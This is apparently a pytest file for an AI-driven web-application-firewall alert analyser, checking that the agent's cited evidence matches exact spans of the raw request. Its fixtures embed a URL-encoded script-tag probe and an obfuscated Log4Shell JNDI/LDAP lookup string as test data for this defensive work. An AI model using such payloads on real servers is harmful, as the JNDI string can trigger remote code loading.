"""Synthetic-only source selection, provenance, compatibility and budget tests."""
import copy
import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.agent.contracts import EvidenceSelectionOutput, EvidenceSelectionCorrectionOutput, WAFAnalysisOutput
from app.agent.evidence import EvidenceSourceResolver
from app.agent.evidence_candidates import resolve_selection, MAX_CANDIDATES
from app.agent.input_builder import build_agent_input
from app.services.http_parser import parse_http_payload
from app.services.payload_decoding import decode_payload
from app.services.provider_options import strict_json_schema
from app.models import Analysis
from app import worker
from test_grounding_repair import execute
from test_moduagent_worker import primary_output


RAW = "GET /?q=%3Cscript%3E HTTP/1.1\r\nHost: example.invalid\r\n\r\n"


def build(raw=RAW, event=None, **kwargs):
    return build_agent_input(event or {}, raw, parse_http_payload(raw), 32768, 3072,
                             decoding=decode_payload(raw), evidence_selection=True, **kwargs)


def selected(*ids):
    value = primary_output().model_dump(mode="json")
    value["evidence"] = [{"source_id": ident, "interpretation_ko": "원문과 정적 변환을 구분한 가상 해석"} for ident in ids]
    return EvidenceSelectionOutput.model_validate(value)


def patch(index=0, source_id="c1", **kwargs):
    return EvidenceSelectionCorrectionOutput(corrections=[{"index": index, "source_id": source_id}],
                                             requires_reanalysis=False, **kwargs)


def resolver(raw, built, event=None):
    document = json.loads(built.text)
    return EvidenceSourceResolver(raw, event or {}, parse_http_payload(raw),
        submitted_payload_spans=built.retained_payload_spans, submitted_event=document["event"],
        decoding_hints=document.get("decoded_payload_hints"))


@pytest.mark.parametrize("raw", [RAW, RAW.replace("\r\n", "\r"), RAW.replace("\r\n", r"\r\n"),
    'vendor=fixture uri=/echo body=%3Cscript%3E', 'GET / HTTP/1.1\r\n\r\n' + '한글\\\t\u0000' * 25000,
    'GET / HTTP/1.1\r\nX-Pad: ' + 'a' * 84000 + '\r\nX-Test: ${${lower:j}ndi:ldap://example.invalid/a}\r\n\r\n'])
def test_candidates_are_bounded_exact_submitted_sources(raw):
    built = build(raw)
    document = json.loads(built.text)
    catalog = document["evidence_candidates"]
    assert len(built.text) <= built.estimated_input_token_budget * 3
    assert 0 < len(catalog["items"]) <= MAX_CANDIDATES
    assert len({item["source_id"] for item in catalog["items"]}) == len(catalog["items"])
    for item in catalog["items"]:
        assert len(item["excerpt"]) <= 300
        result, issues, resolutions = resolve_selection(selected(item["source_id"]), catalog, resolver(raw, built))
        assert not issues and len(resolutions) == 1
        assert result.evidence[0].excerpt in raw
        assert raw[item["start"]:item["end"]] == result.evidence[0].excerpt


def test_decoding_stays_derived_and_linked_to_raw_candidate():
    document = json.loads(build().text)
    hints = document["decoded_payload_hints"]["items"]
    assert hints
    linked = [item for item in document["evidence_candidates"]["items"] if item.get("decoded_hint_indexes")]
    assert linked
    for candidate in linked:
        for index in candidate["decoded_hint_indexes"]:
            assert candidate["excerpt"] in hints[index]["original"]
            assert candidate["excerpt"] in RAW
    assert not any(item["excerpt"] == "<script>" for item in document["evidence_candidates"]["items"])


def test_clipped_metadata_annotation_is_never_offered_as_raw_source():
    from app.agent.evidence_candidates import build_candidates
    original = {"extra_fields": {"value": "a" * 400}}
    submitted = {"extra_fields": {"value": "a" * 10 + "…"}}
    catalog = build_candidates(RAW, submitted, parse_http_payload(RAW), [(0, len(RAW))], None, 8192,
                               original_event=original)
    assert catalog["omitted"]
    assert not any(item["field"] == "extra_fields.value" for item in catalog["items"])


@pytest.mark.parametrize("mutate", ["foreign_id", "duplicate_id", "wrong_offset", "decoded_text", "wrong_field", "omitted_occurrence"])
def test_invalid_candidates_cannot_bypass_raw_validation(mutate):
    raw = "HEAD" + "x" * 90000 + "HEAD"
    built = build(raw)
    catalog = json.loads(built.text)["evidence_candidates"]
    item = catalog["items"][0]
    output = selected(item["source_id"])
    if mutate == "foreign_id":
        output = selected("c999")
    elif mutate == "duplicate_id":
        catalog["items"].append(copy.deepcopy(item))
    elif mutate == "wrong_offset":
        item["start"] += 1
    elif mutate == "decoded_text":
        item["excerpt"] = "fabricated-decoded-value"
    elif mutate == "wrong_field":
        item["field"] = "payload.body"
    else:
        item.update(excerpt="x", start=50000, end=50001)
    result, issues, _ = resolve_selection(output, catalog, resolver(raw, built))
    assert issues and result.evidence == []


def test_selection_returns_public_contract_without_model_retyping(monkeypatch):
    built = build()
    call, calls = execute(monkeypatch, [selected("c1")], raw=RAW, built=built)
    assert len(calls) == 1 and calls[0]["output_model"] is EvidenceSelectionOutput
    assert type(call.output) is WAFAnalysisOutput
    assert call.output.verdict.value == "true_positive"
    assert call.output.evidence[0].excerpt == RAW
    assert call.grounding_history[0]["output"]["evidence"][0]["source_id"] == "c1"
    assert call.grounding_history[0]["source_resolutions"][0]["start"] == 0
    assert RAW not in str(call.telemetry)


def test_invalid_selection_corrected_once_without_rewriting_meaning(monkeypatch):
    first = selected("c1", "c999")
    before = first.model_dump(mode="json")
    call, calls = execute(monkeypatch, [first, patch(1, "c2")], raw=RAW, built=build())
    assert len(calls) == 2 and calls[1]["output_model"] is EvidenceSelectionCorrectionOutput
    assert calls[1]["output_validation_max_attempts"] == 1
    assert call.output.verdict.value == "true_positive"
    assert [item.interpretation_ko for item in call.output.evidence] == [item.interpretation_ko for item in first.evidence]
    assert first.model_dump(mode="json") == before
    assert call.telemetry["evidence_grounding_retry"]["recovered"]


@pytest.mark.parametrize("correction", [patch(0, "c2"), patch(1, "c999"),
    EvidenceSelectionCorrectionOutput(corrections=[], requires_reanalysis=False),
    EvidenceSelectionCorrectionOutput(corrections=[{"index": 1, "source_id": "c2"}], requires_reanalysis=True)])
def test_bad_or_unresolved_patch_keeps_valid_evidence_but_abstains(monkeypatch, correction):
    call, calls = execute(monkeypatch, [selected("c1", "c999"), correction], raw=RAW, built=build())
    assert len(calls) == 2 and call.output.verdict.value == "inconclusive"
    assert call.output.evidence[0].excerpt == RAW
    assert not call.output.tuning_recommendation.recommended
    assert call.telemetry["evidence_grounding_retry"]["requires_review"]


def test_metadata_alone_does_not_confirm(monkeypatch):
    analysis = Analysis(signature="HTTP Inspection", extra_fields={})
    built = build(event=worker._event_document(analysis))
    item = next(item for item in json.loads(built.text)["evidence_candidates"]["items"] if item["field"] == "signature")
    call, calls = execute(monkeypatch, [selected(item["source_id"])], raw=RAW, built=built, analysis=analysis)
    assert len(calls) == 1 and call.output.verdict.value == "inconclusive"
    assert call.telemetry["evidence_grounding_retry"]["context_only_evidence"]


def test_old_output_contract_does_not_silently_pass_selection(monkeypatch):
    call, calls = execute(monkeypatch, [primary_output()], raw=RAW, built=build())
    assert len(calls) == 1 and not call.succeeded


def test_selection_schema_and_correction_forbid_fabricated_quote_and_extra_fields():
    value = selected("c1").model_dump(mode="json")
    value["evidence"][0]["excerpt"] = "invented"
    with pytest.raises(ValidationError):
        EvidenceSelectionOutput.model_validate(value)
    with pytest.raises(ValidationError):
        EvidenceSelectionCorrectionOutput(corrections=[{"index": 0, "source_id": "c1"}] * 2, requires_reanalysis=False)
    schema = strict_json_schema(EvidenceSelectionOutput.model_json_schema())
    for node in [schema, *schema["$defs"].values()]:
        if node.get("type") == "object":
            assert node["additionalProperties"] is False
            assert set(node["required"]) == set(node["properties"])


def test_same_frozen_samples_have_valid_candidate_catalogs():
    root = Path(__file__).resolve().parents[2]
    for name in ("waf-parser-stress-v1/parser_stress_50.json", "waf-dummy-v1/hard_50.json", "waf-dummy-v1/medium_50.json"):
        events = json.loads((root / "samples" / name).read_text())
        if isinstance(events, dict):
            events = events["events"]
        assert len(events) == 50
        for event in events:
            raw = event["payload"]
            built = build(raw)
            catalog = json.loads(built.text)["evidence_candidates"]
            for item in catalog["items"]:
                _, issues, _ = resolve_selection(selected(item["source_id"]), catalog, resolver(raw, built))
                assert not issues


@pytest.mark.parametrize("provider", ["vllm", "openai"])
@pytest.mark.parametrize("repair", [False, True])
def test_selection_contract_on_actual_moduagent_wire_with_mocked_http(monkeypatch, provider, repair):
    import asyncio
    import httpx
    from app.agent.executor import execute_structured_agent
    from test_agent_openai import completion, install_http, openai_profile, assert_strict_schema
    from test_agent_executor import profile
    reply = selected("c1")
    bad = reply.model_dump(mode="json")
    bad["evidence"][0]["source_id"] = "decoded_payload_hints.items.0.decoded"
    requests, options = install_http(monkeypatch, lambda request, count: httpx.Response(200,
        json=completion(json.dumps(bad) if repair and count == 1 else reply.model_dump_json())))
    checks = []
    result = asyncio.run(execute_structured_agent(profile=openai_profile() if provider == "openai" else profile(),
        api_key="synthetic-key", instructions="synthetic-selection-policy", user_input=build().text,
        session_id="synthetic", agent_name="waf-primary", output_model=EvidenceSelectionOutput,
        egress_check=lambda: checks.append(True)))
    assert result.succeeded and result.output == reply and len(requests) == (2 if repair else 1)
    assert len(checks) >= len(requests) + 1
    assert options == [{"verify": True, "follow_redirects": False, "trust_env": False}]
    schema = json.loads(requests[0].content)["response_format"]["json_schema"]["schema"]
    assert set(schema["$defs"]["EvidenceSelection"]["properties"]) == {"source_id", "interpretation_ko"}
    if provider == "openai":
        assert_strict_schema(schema)
    if repair:
        assert result.telemetry["output_validation_retry"]["recovered"]
        assert "decoded_payload_hints.items.0.decoded" not in json.dumps(result.telemetry)


@pytest.mark.parametrize("revision", ["2.6", "2.7", "2.8", "2.9", "2.10", "2.11"])
def test_older_pinned_execution_keeps_its_protocol_after_deployment(client, event_payload, registered_vllm_target, monkeypatch, revision):
    from app.agent.contracts import EvidenceAssessmentOutput
    from agent_selection_helpers import model_output
    from app.agent.executor import AgentCallResult
    from app.models import VLLMProfile
    from app.services import prompt_snapshots
    from test_prompt_snapshots import fake_output, login
    login(client)
    with monkeypatch.context() as old:
        old.setattr(prompt_snapshots, "FIXED_RULES_VERSION", f"waf-system-v{revision}")
        old.setattr(prompt_snapshots, "PROMPT_VERSION", f"waf-judgment-v{revision}")
        contract_description = "field/excerpt exact citation" if revision == "2.6" else "source_id selection"
        old.setattr(prompt_snapshots, "build_role_instructions", lambda policy: (
            "synthetic-old-primary: " + contract_description, "synthetic-old-verifier: " + contract_description))
        created = client.post("/api/v1/analyses", json=event_payload).json()
    calls = []
    async def fake(**kwargs):
        calls.append(kwargs)
        assert ("evidence_candidates" in json.loads(kwargs["user_input"])) == (revision != "2.6")
        document = json.loads(kwargs["user_input"])
        assert ("request_integrity" in document) == (revision in {"2.9", "2.10", "2.11"})
        if "request_integrity" in document:
            assert document["request_integrity"]["version"] == "request-integrity-v1"
        expected_contract = {
            "2.6": WAFAnalysisOutput, "2.10": EvidenceAssessmentOutput, "2.11": EvidenceAssessmentOutput,
        }.get(revision, EvidenceSelectionOutput)
        assert kwargs.get("output_model", WAFAnalysisOutput) is expected_contract
        return AgentCallResult(model_output(fake_output(), kwargs), "synthetic", None, "completed", None, None, {})
    monkeypatch.setattr(worker, "execute_structured_agent", fake)
    with client.app.state.session_factory() as db:
        db.add(VLLMProfile(name="synthetic-legacy", base_url="http://10.0.0.10:8000/v1", model_name="synthetic", status="production"))
        db.commit()
        row = db.get(Analysis, created["id"])
        before = row.prompt_snapshot_ciphertext
        worker.process_moduagent(db, client.app.state.crypto, row, "", .75)
        assert row.prompt_snapshot_ciphertext == before and row.status == "completed"
        assert ("analyst_assessment" in row.result_json) == (revision in {"2.10", "2.11"})
        assert row.result_json["diagnostics"]["version"] == ("evidence-repair-v2" if revision == "2.6" else "evidence-selection-v1")
        assert row.prompt_version.startswith(f"waf-judgment-v{revision}/policy-")
    assert len(calls) == 2
    assert calls[0]["instructions"].startswith("synthetic-old-primary")
    assert calls[0]["user_input"] == calls[1]["user_input"]
    assert all("판단 순서:" not in call["instructions"] for call in calls)
